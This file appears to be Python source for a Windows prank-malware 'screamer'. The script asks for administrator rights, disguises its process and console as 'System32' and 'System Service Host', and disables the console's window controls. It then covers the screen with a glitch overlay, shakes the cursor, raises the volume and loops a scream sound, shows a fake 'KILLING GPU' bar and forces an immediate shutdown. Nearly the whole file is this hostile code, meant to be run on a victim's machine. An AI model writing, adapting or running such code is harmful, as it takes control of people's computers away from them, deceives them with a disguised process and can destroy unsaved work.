import sys
import ctypes
import time
import os
import random
import pyautogui
import threading
from PyQt5.QtCore import Qt
from PyQt5 import QtWidgets, QtGui, QtCore
from PIL import ImageGrab
from colorama import Fore, init
from tqdm import tqdm
import win32api
import win32process
import win32security
import winsound
import signal
import setproctitle
setproctitle.setproctitle("System32")



class WindowsAPI:
    """Handles Windows API interactions and constants"""

    # Initialize Windows API DLLs
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    # Window style constants
    WS_EX_TRANSPARENT = 0x00000020
    WS_EX_LAYERED = 0x00080000
    WS_EX_TOOLWINDOW = 0x00000080
    WS_EX_NOACTIVATE = 0x08000000
    WS_EX_APPWINDOW = 0x00040000
    GWL_EXSTYLE = -20
    HWND_TOPMOST = -1

    # Window position flags
    SWP_NOMOVE = 0x0002
    SWP_NOSIZE = 0x0001
    SWP_NOACTIVATE = 0x0010
    SWP_SHOWWINDOW = 0x0040

    @classmethod
    def make_console_unclickable(cls):
        """Makes the console window unclickable and removes system controls"""
        console_handle = cls.kernel32.GetConsoleWindow()

        # Remove window controls
        style = cls.user32.GetWindowLongW(console_handle, -16)
        style &= ~0x80000  # Remove WS_MAXIMIZEBOX
        style &= ~0x40000  # Remove WS_MINIMIZEBOX
        style &= ~0x20000  # Remove WS_THICKFRAME
        style &= ~0x10000  # Remove WS_SYSMENU
        cls.user32.SetWindowLongW(console_handle, -16, style)

        # Set extended window style
        ex_style = cls.user32.GetWindowLongW(console_handle, cls.GWL_EXSTYLE)
        ex_style |= cls.WS_EX_TRANSPARENT
        ex_style |= cls.WS_EX_LAYERED
        ex_style |= cls.WS_EX_TOOLWINDOW
        ex_style |= cls.WS_EX_NOACTIVATE
        ex_style &= ~cls.WS_EX_APPWINDOW
        cls.user32.SetWindowLongW(console_handle, cls.GWL_EXSTYLE, ex_style)

        # Apply changes
        cls.user32.SetWindowPos(
            console_handle, cls.HWND_TOPMOST,
            0, 0, 0, 0,
            cls.SWP_NOMOVE | cls.SWP_NOSIZE | cls.SWP_NOACTIVATE | cls.SWP_SHOWWINDOW
        )

        # Force window to lose focus
        cls.user32.SetForegroundWindow(cls.user32.GetDesktopWindow())


class ProcessManager:
    """Handles process-related operations and privileges"""

    @staticmethod
    def mask_as_system_process():
        """Masks the current process as a system process"""
        current_process = win32api.GetCurrentProcess()
        win32process.SetPriorityClass(current_process, win32process.HIGH_PRIORITY_CLASS)

        token = win32security.OpenProcessToken(current_process, win32security.TOKEN_ALL_ACCESS)
        token_info = win32security.GetTokenInformation(token, win32security.TokenUser)

        try:
            WindowsAPI.kernel32.SetConsoleTitleW("System Service Host")
        except:
            pass

    @staticmethod
    def request_admin_privileges():
        """Requests administrator privileges for the current process"""
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()


class ConsoleManager:
    """Manages console window operations and display"""

    def __init__(self):
        init(autoreset=True)
        os.system('mode con: cols=100 lines=100')

    @staticmethod
    def show_loading(steps=32, message="UNPACKING"):
        """Shows a loading progress bar"""
        for i in tqdm(range(steps), message, ncols=100):
            time.sleep(random.uniform(0.01, 0.3))


# Initialize colorama
init(autoreset=True)
os.system('mode con: cols=100 lines=100')

# Windows API setup
user32 = ctypes.WinDLL('user32', use_last_error=True)
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Constants
WS_EX_TRANSPARENT = 0x00000020
WS_EX_LAYERED = 0x00080000
WS_EX_TOOLWINDOW = 0x00000080
WS_EX_NOACTIVATE = 0x08000000
WS_EX_APPWINDOW = 0x00040000
GWL_EXSTYLE = -20
HWND_TOPMOST = -1
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
SWP_SHOWWINDOW = 0x0040


class GlitchWindow(QtWidgets.QWidget):
    """Main window for displaying glitch effects"""

    def __init__(self):
        super().__init__()
        self._setup_window()
        self._setup_timer()
        self.degradation_time = 0
        self.start_artifacts = 500
        self._setup_cursor_shake()

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_6:
            os._exit(0)

    def _setup_window(self):
        """Sets up the window properties"""
        self.setWindowFlags(
            QtCore.Qt.FramelessWindowHint |
            QtCore.Qt.WindowStaysOnTopHint |
            QtCore.Qt.X11BypassWindowManagerHint |
            QtCore.Qt.Tool
        )
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground)
        self.setAttribute(QtCore.Qt.WA_NoSystemBackground)

        screen = QtWidgets.QApplication.primaryScreen().size()
        self.setGeometry(0, 0, screen.width(), screen.height())

    def _setup_timer(self):
        """Sets up the update timer"""
        self.timer = QtCore.QTimer()
        self.timer.timeout.connect(self.update)
        self.timer.start(200)

    def _setup_cursor_shake(self):
        """Sets up the cursor shake timer"""
        self.cursor_shake_timer = QtCore.QTimer()
        self.cursor_shake_timer.timeout.connect(self._shake_cursor)
        self.cursor_shake_timer.start(50)  # Shake every 50ms

    def _shake_cursor(self):
        """Shakes the cursor randomly"""
        cursor = QtGui.QCursor()
        current_pos = cursor.pos()
        random_x = random.randint(-50, 50)
        random_y = random.randint(-50, 50)
        cursor.setPos(current_pos.x() + random_x, current_pos.y() + random_y)

    def paintEvent(self, event):
        """Handles the painting of glitch effects"""
        painter = QtGui.QPainter(self)
        try:
            screen = ImageGrab.grab()
            screen_width, screen_height = screen.size
            screen_pixels = screen.load()

            for _ in range(self.start_artifacts):
                x = random.randint(0, screen_width - 1)
                y = random.randint(0, screen_height - 1)
                color = QtGui.QColor(
                    screen_pixels[x, y][0],
                    screen_pixels[x, y][1],
                    screen_pixels[x, y][2],
                    random.randint(240, 255)
                )
                width = random.randint(10, 130)
                height = random.randint(2, 20)
                painter.fillRect(x, y, width, height, color)
        except:
            pass


class ConsoleWindow:
    def __init__(self):
        pass
    @staticmethod
    def Load(steps=32, message="UNPACKING"):
        for i in tqdm(range(steps), message, ncols=100):
            time.sleep(random.uniform(0.01, 0.3))
    @staticmethod
    def show_portreit():
        os.system('mode con: cols=100 lines=100')
        print(Fore.RED + """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢏⡯⣭⢭⣭⢛⣙⣋⢛⡉⣉⡭⢩⠟⠭⠋⠁⠁⠀⠀⠀⠫⢝⡻⠝⣯⢯⡙⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⣦⢟⡼⢻⣾⢏⣳⢉⡓⣋⢿⠹⣥⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡴⣞⡯⣷⣫⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣆⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡻⢾⡽⣞⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠰⡊⡝⣦⡝⣷⣻⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡰⡈⠥⢣⡙⣰⢻⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣷⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡌⠔⡡⢊⡕⣸⢰⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⣏⠿⣝⣂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠀⢰⢡⢣⠞⣥⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⡾⡱⢎⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠠⠀⢣⣋⢮⣝⡯⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢫⠔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠣⠁⢨⣿⣔⣯⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡿⣜⡌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡐⠢⢱⣼⣿⣿⣟⣡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⢮⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣼⡾⣿⣃⣼⣿⣿⡿⠋⠉⠁⠀⠁⠈⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠉⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⢶⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⣜⣻⣧⣯⣜⢿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢄⣹⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⣿⣿⣯⣝⣛⢳⠧⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠐⠀⡐⣮⢽⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣼⣿⣿⣿⢿⣗⢸⣟⠶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠆⣢⠎⣠⣷⣻⣿⣿⣿⣿⣦⣤⣄⠀⠀⠀⠀⠀⣀⣀⣿⣿⣿⣿⣿⣿⣿⣿⣮⣄⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⠘⣿⠘⢯⣻⡔⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⢖⣺⠄⠐⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣾⣿⣿⣿⠟⠋⠙⠛⠛⠉⠻⣿⣿⣿⣦⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣽⣷⣄⡉⠳⣡⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⡼⣱⣾⠋⢀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠿⠿⣿⣿⣦⡘⢧⠄⠀⠀⠀⠀
⠀⠀⢠⠞⡴⠋⢀⣴⣿⣿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⣤⣿⣿⣄⡀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠀⠀⠀⠀⠙⣿⣿⣷⣼⡯⡄⠀⠀⠀
⠀⡈⣏⠿⠀⢰⣿⠉⠁⠁⠀⠀⠀⠀⠈⠉⠹⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠀⢀⣸⣿⣿⣿⣿⣿⣱⠆⠀⠀
⠀⣭⡇⢠⡆⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣾⣿⣿⣿⣿⣿⣷⣏⠀⠀
⠀⢾⣿⣾⡇⠘⣷⣴⡀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⠿⣿⣿⣿⣿⣿⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣯⠀⠀
⠀⢹⡿⣿⣏⠀⠻⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠑⢲⡀⢀⡀⣀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠀⠀⠀⠈⠀⠀⠀⠀⣠⣿⣿⣿⢿⣿⣿⣿⣿⣿⣟⠀⠀
⠀⠀⠃⢹⣿⡀⣷⡈⢻⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠈⠀⢉⡼⣡⠀⢀⠦⡡⠀⠀⠀⠀⠀⠀⠀⠀⠠⢡⠀⠀⠀⢞⡐⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠟⢁⣸⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠹⠷⣿⡿⣤⡉⠻⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠁⠀⢩⣶⣳⠁⠀⢠⣻⣕⠂⠀⠀⠰⠁⠀⠀⠈⠀⠀⠀⠀⠀⣠⣼⣿⣿⠟⠋⡁⣀⣭⣿⣿⣿⣿⣟⠣⠈⠀⠀
⠀⠀⠀⠀⠀⠀⠹⢽⣳⢻⡶⣌⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⣟⡷⠀⠀⢣⣿⣼⠋⠀⠀⠂⠁⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⠟⢡⣾⣿⣿⣿⣿⣿⡿⠟⠉⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠁⠧⡙⠶⣶⣤⣭⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠐⠡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣡⣾⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠱⢎⠻⡽⣛⠿⣻⣟⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠣⡱⣌⡱⢧⣻⣽⣳⡭⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡙⢧⢴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠑⣾⣽⣷⣻⣾⣿⣮⠅⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⡜⣿⣿⣿⣟⣿⣯⡗⡀⠀⠊⠅⠂⠀⠀⣄⢦⡀⢠⡙⡄⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⡏⠁⠀⠀⡀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢻⣿⣿⣿⣿⡻⣥⠀⠀⠀⠀⠀⠐⣮⠷⡁⠀⢚⠰⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠌⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⡿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠊⠃⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠆⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠈⢿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠍⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠻⣿⣿⣿⣞⡷⣠⠀⠀⠀⠀⠀⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠘⣿⢟⣯⣟⡵⢯⣶⡄⠀⣤⣴⣾⣿⣻⣿⣿⣿⣿⣿⣿⡏⠉⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢻⣯⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⡿⢿⠷⠻⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠸⠿⠿⠿⣿⡿⣿⣿⣿⣿⣿⡿⠿⠟⠅⠡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")


class SoundTrack:
    def __init__(self):
        ScreamThread = threading.Thread(target=self.Scream)
        AddVolumeThread = threading.Thread(target = self.increase_volume, args = (100,))
        AddVolumeThread.start()
        ScreamThread.start()
    @staticmethod
    def Scream():
        wav_path = os.path.join(os.path.dirname(__file__), "scream.wav")
        while True:
            winsound.PlaySound(wav_path, winsound.SND_FILENAME)



    @staticmethod
    def increase_volume(amount : int):
        for i in range(amount):
            pyautogui.press("volumeup",interval = 0.01,presses=amount)


def run_Death_Thread():
    console.Load(100, "KILLING GPU")

    time.sleep(1)
    shutdown_pc()


def mask_as_system_process():
    # Get current process handle
    current_process = win32api.GetCurrentProcess()

    # Set process priority to high
    win32process.SetPriorityClass(current_process, win32process.HIGH_PRIORITY_CLASS)

    # Get process token
    token = win32security.OpenProcessToken(current_process, win32security.TOKEN_ALL_ACCESS)

    # Get token information
    token_info = win32security.GetTokenInformation(token, win32security.TokenUser)

    # Set process name to appear as system process
    try:
        # Try to rename the process (requires admin rights)
        kernel32.SetConsoleTitleW("System Service Host")
    except:
        pass


def make_console_unclickable():
    # Get the console window handle
    console_handle = kernel32.GetConsoleWindow()

    # Set console window style
    style = user32.GetWindowLongW(console_handle, -16)  # GWL_STYLE
    style &= ~0x80000  # Remove WS_MAXIMIZEBOX
    style &= ~0x40000  # Remove WS_MINIMIZEBOX
    style &= ~0x20000  # Remove WS_THICKFRAME
    style &= ~0x10000  # Remove WS_SYSMENU (removes system menu, preventing Alt+F4)
    user32.SetWindowLongW(console_handle, -16, style)

    # Set extended window style to make it unclickable
    ex_style = user32.GetWindowLongW(console_handle, GWL_EXSTYLE)
    ex_style |= WS_EX_TRANSPARENT  # Make window unclickable
    ex_style |= WS_EX_LAYERED  # Required for transparency
    ex_style |= WS_EX_TOOLWINDOW  # Remove from taskbar
    ex_style |= WS_EX_NOACTIVATE  # Prevent activation
    ex_style &= ~WS_EX_APPWINDOW  # Remove from taskbar
    user32.SetWindowLongW(console_handle, GWL_EXSTYLE, ex_style)

    # Apply the changes
    user32.SetWindowPos(
        console_handle, HWND_TOPMOST,  # Always on top
        0, 0,  # x, y position
        0, 0,  # width, height (will be ignored due to SWP_NOSIZE)
        SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE | SWP_SHOWWINDOW
    )

    # Force window to lose focus
    user32.SetForegroundWindow(user32.GetDesktopWindow())


def shutdown_pc():
    os.system("shutdown -s -t 1")

if __name__ == '__main__':
    # Request admin privileges
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    make_console_unclickable()

    mask_as_system_process()

    console = ConsoleWindow()
    console.Load()
    console.show_portreit()
    app = QtWidgets.QApplication(sys.argv)
    window = GlitchWindow()
    sound = SoundTrack()
    window.showFullScreen()

    DeathThread = threading.Thread(target=run_Death_Thread)

    DeathThread.start()

    sys.exit(app.exec_())
